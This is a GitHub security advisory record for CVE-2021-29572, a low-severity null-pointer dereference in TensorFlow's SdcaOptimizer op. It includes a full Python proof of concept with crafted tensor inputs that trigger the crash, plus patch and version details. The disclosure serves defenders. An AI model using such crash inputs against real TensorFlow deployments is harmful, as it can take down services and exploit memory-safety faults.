{
    "ghsaId": "GHSA-5gqf-456p-4836",
    "severity": "LOW",
    "summary": "Reference binding to nullptr in `SdcaOptimizer`",
    "description": "### Impact\nThe implementation of `tf.raw_ops.SdcaOptimizer` triggers undefined behavior due to dereferencing a null pointer:\n\n```python\nimport tensorflow as tf\n\nsparse_example_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_feature_indices = [tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_feature_values = []\n\ndense_features = []\ndense_weights = []\n\nexample_weights = tf.constant((0.0), dtype=tf.float32)\nexample_labels = tf.constant((0.0), dtype=tf.float32)\n\nsparse_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_weights = [tf.constant((0.0), dtype=tf.float32), tf.constant((0.0), dtype=tf.float32)]\n  \nexample_state_data = tf.constant([0.0, 0.0, 0.0, 0.0], shape=[1, 4], dtype=tf.float32)\n  \ntf.raw_ops.SdcaOptimizer(\n  sparse_example_indices=sparse_example_indices,\n  sparse_feature_indices=sparse_feature_indices,\n  sparse_feature_values=sparse_feature_values, dense_features=dense_features,\n  example_weights=example_weights, example_labels=example_labels, \n  sparse_indices=sparse_indices, sparse_weights=sparse_weights, \n  dense_weights=dense_weights, example_state_data=example_state_data,\n  loss_type=\"logistic_loss\", l1=0.0, l2=0.0, num_loss_partitions=1,\n  num_inner_iterations=1, adaptative=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/60a45c8b6192a4699f2e2709a2645a751d435cc3/tensorflow/core/kernels/sdca_internal.cc) does not validate that the user supplied arguments satisfy all [constraints expected by the op](https://www.tensorflow.org/api_docs/python/tf/raw_ops/SdcaOptimizer).\n\n### Patches\nWe have patched the issue in GitHub commit [f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb](https://github.com/tensorflow/tensorflow/commit/f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
    "permalink": "https://github.com/advisories/GHSA-5gqf-456p-4836",
    "publishedAt": "2021-05-21T14:25:31Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-5gqf-456p-4836"
        },
        {
            "type": "CVE",
            "value": "CVE-2021-29572"
        }
    ]
}